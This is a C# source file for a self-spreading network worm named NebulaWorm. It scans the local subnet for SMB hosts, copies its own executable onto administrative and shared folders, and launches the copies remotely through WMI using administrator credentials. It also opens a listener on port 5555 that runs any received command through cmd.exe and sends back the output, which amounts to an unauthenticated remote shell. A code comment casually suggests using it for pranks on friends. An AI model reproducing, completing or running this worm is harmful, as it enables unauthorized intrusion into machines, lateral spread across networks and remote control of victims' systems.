using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Text;
using System.Management;  // Reference System.Management installed automatically on windows 7,8,8.1,10,11 no need for .dll add reference

namespace NebulaWorm
{
    internal static class LanSpread
    {
        private static readonly Random rnd = new Random();

        private static readonly string[] CommonShares = new string[]
        {
            "C$",
            "ADMIN$",
            "Users",
            "Public",
            "Documents",
            "Downloads",
            "Shared",
            "Temp",
            "IPC$"
        };

        private const int MaxConcurrentTasks = 50;
        private const int RemoteExecPort = 5555;

        public static async Task SpreadAsync()
        {
            Task.Run(() => StartRemoteExecutionListener());

            string source = Process.GetCurrentProcess().MainModule.FileName;
            string baseIp = GetLocalSubnet();

            if (baseIp == null)
            {
                Console.WriteLine("[LanSpread] Subnet not found.");
                return;
            }

            var throttler = new SemaphoreSlim(MaxConcurrentTasks);
            var tasks = new List<Task>();

            for (int i = 1; i < 255; i++)
            {
                string ip = string.Format("{0}.{1}", baseIp, i);

                await throttler.WaitAsync();

                tasks.Add(Task.Run(async () =>
                {
                    try
                    {
                        if (!await IsPortOpenAsync(ip, 445, 300))
                            return;

                        if (!IsHostAlive(ip))
                            return;

                        foreach (var share in CommonShares)
                        {
                            string destPath = string.Format(@"\\{0}\{1}\nebula.exe", ip, share);

                            if (File.Exists(destPath))
                                continue;

                            try
                            {
                                File.Copy(source, destPath);
                                Console.WriteLine("[LanSpread] Successful spread!: " + destPath);

                                await TryScheduleRemoteExecutionAsync(ip, destPath);

                                break;
                            }
                            catch (UnauthorizedAccessException)
                            {

                            }
                            catch (IOException)
                            {

                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine("[LanSpread] Error " + ip + " - " + share + ": " + ex.Message);
                            }
                        }
                    }
                    catch { }
                    finally
                    {
                        await Task.Delay(rnd.Next(100, 500));
                        throttler.Release();
                    }
                }));
            }

            await Task.WhenAll(tasks);
            Console.WriteLine("[LanSpread] Done.");
        }

        private static void StartRemoteExecutionListener()
        {
            TcpListener listener = null;
            try
            {
                listener = new TcpListener(System.Net.IPAddress.Any, RemoteExecPort);
                listener.Start();
                Console.WriteLine("[RemoteExec] Listening on port " + RemoteExecPort + "...");

                while (true)
                {
                    using (TcpClient client = listener.AcceptTcpClient())
                    {
                        using (NetworkStream stream = client.GetStream())
                        {
                            using (StreamReader reader = new StreamReader(stream, Encoding.UTF8))
                            {
                                using (StreamWriter writer = new StreamWriter(stream, Encoding.UTF8) { AutoFlush = true })
                                {
                                    string cmd = reader.ReadLine();
                                    Console.WriteLine("[RemoteExec] Command received: " + cmd);

                                    if (!string.IsNullOrWhiteSpace(cmd))
                                    {
                                        string output = ExecuteCommand(cmd);
                                        writer.WriteLine(output);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[RemoteExec] Listener error: " + ex.Message);
            }
            finally
            {
                if (listener != null)
                    listener.Stop();
            }
        }

        private static string ExecuteCommand(string command)
        {
            try
            {
                var psi = new ProcessStartInfo("cmd.exe", "/c " + command)
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (var process = Process.Start(psi))
                {
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();

                    if (!string.IsNullOrWhiteSpace(error))
                        return error;
                    return output;
                }
            }
            catch (Exception ex)
            {
                return "Error executing command: " + ex.Message;
            }
        }

        private static string GetLocalSubnet()
        {
            try
            {
                var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
                foreach (var ip in host.AddressList)
                {
                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        var parts = ip.ToString().Split('.');
                        if (parts.Length == 4)
                            return string.Format("{0}.{1}.{2}", parts[0], parts[1], parts[2]);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[LanSpread] Subnet Error: " + ex.Message);
            }
            return null;
        }

        private static bool IsHostAlive(string ip)
        {
            try
            {
                using (var ping = new Ping())
                {
                    var reply = ping.Send(ip, 500);
                    return reply != null && reply.Status == IPStatus.Success;
                }
            }
            catch { }
            return false;
        }

        private static async Task<bool> IsPortOpenAsync(string host, int port, int timeout)
        {
            try
            {
                using (var client = new TcpClient())
                {
                    var connectTask = client.ConnectAsync(host, port);
                    if (await Task.WhenAny(connectTask, Task.Delay(timeout)) == connectTask)
                        return client.Connected;
                    else
                        return false;
                }
            }
            catch
            {
                return false;
            }
        }

        
        private static async Task TryScheduleRemoteExecutionAsync(string ip, string remoteFilePath)
        {
            await Task.Run(() =>
            {
                try
                {
                    ConnectionOptions options = new ConnectionOptions
                    {
                        Username = @"TARGET_MACHINE_NAME\Administrator", // these are not possible with wmi neither anything yall need to change this place, this place is usefull for pranks to do on your friends or known people
                        Password = "yourpassword",                       
                        Impersonation = ImpersonationLevel.Impersonate,
                        EnablePrivileges = true,
                        Authentication = AuthenticationLevel.PacketPrivacy,
                        Timeout = TimeSpan.FromSeconds(10)
                    };

                    string wmiPath = $"\\\\{ip}\\root\\cimv2";

                    ManagementScope scope = new ManagementScope(wmiPath, options);
                    scope.Connect();

                    if (!scope.IsConnected)
                    {
                        Console.WriteLine("[LanSpread] WMI connection failed to " + ip);
                        return;
                    }

                    using (ManagementClass processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), null))
                    {
                        ManagementBaseObject inParams = processClass.GetMethodParameters("Create");
                        inParams["CommandLine"] = remoteFilePath;

                        ManagementBaseObject outParams = processClass.InvokeMethod("Create", inParams, null);

                        uint returnCode = (uint)(outParams.Properties["ReturnValue"].Value);
                        if (returnCode == 0)
                            Console.WriteLine("[LanSpread] Remote execution started on " + ip);
                        else
                            Console.WriteLine("[LanSpread] Remote execution failed on " + ip + " with code " + returnCode);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[LanSpread] WMI remote execution error on " + ip + ": " + ex.Message);
                }
            });
        }
    }
}
